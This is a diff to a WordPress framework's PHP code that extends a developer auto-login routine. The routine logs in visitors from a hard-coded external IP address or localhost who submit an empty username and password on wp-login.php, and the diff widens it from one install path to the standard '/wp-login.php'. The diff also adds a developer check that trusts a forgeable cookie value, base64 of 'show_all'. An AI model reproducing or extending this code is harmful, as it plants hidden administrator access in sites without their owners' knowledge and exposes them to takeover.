@@ -19,6 +19,24 @@
     }
 
     add_action( 'wp_logout', 'wfc_developer_logout' );
+
+    /*
+    ===============================
+     * FUNCTION TO CHECK IF DEVELOPER IS LOGGED IN
+     *
+     * @return boolean
+     * @since 2.3
+    ===============================
+    */
+    function wfc_is_dev(){
+        if( isset($_COOKIE['wfc_admin_cake']) ){
+            if( $_COOKIE['wfc_admin_cake'] == base64_encode( 'show_all' ) ){
+                return true;
+            }
+            return false;
+        }
+        return false;
+    }
     /*
     ===============================
     AUTO LOGIN WFC DEVELOPER
@@ -28,7 +46,7 @@
     */
     function wfc_developer_login(){
 
-        if( $_SERVER['REQUEST_URI'] == '/cms-wfc/wp-login.php' || $_SERVER['REQUEST_URI'] == '/scf-framework/wp-login.php' ){
+        if( $_SERVER['REQUEST_URI'] == '/cms-wfc/wp-login.php' || $_SERVER['REQUEST_URI'] == '/wp-login.php' ){
             wfc_developer_logout(); //reset cookies
             if( $_SERVER['REMOTE_ADDR'] == '24.171.162.50' || $_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
                 if( ($_POST['log'] === '' && $_POST['pwd'] === '') ){
@@ -54,19 +72,17 @@
      * @since 2.2
     ===============================
     */
+    add_action( 'admin_init', 'Wfc_Developer_Tools' );
     function Wfc_Developer_Tools(){
-        if( isset($_COOKIE['wfc_admin_cake']) ){
-            if( $_COOKIE['wfc_admin_cake'] == base64_encode( 'show_all' ) ){
+        if( wfc_is_dev() ){
                 add_action( "wp_dashboard_setup", "Wfc_Developer_Dashboard_Widget" );
                 add_filter( 'admin_footer_text', 'Wfc_Developer_Footer' );
                 add_filter( 'admin_body_class', 'Wfc_Developer_Body_Class' );
                 add_action( 'contextual_help', 'Wfc_Developer_Screen_Help', 10, 3 );
                 //add_action('all', 'god');
                 //$wfc_pointers_class = new wfc_pointers_class;
-            }
         }
     }
-    add_action( 'admin_init', 'Wfc_Developer_Tools' );
 
     function Wfc_Developer_Footer( $text ){
         $text = '<span id="footer-thankyou" class="wfc-admin-footer">WFC Developer Logged In</span>';
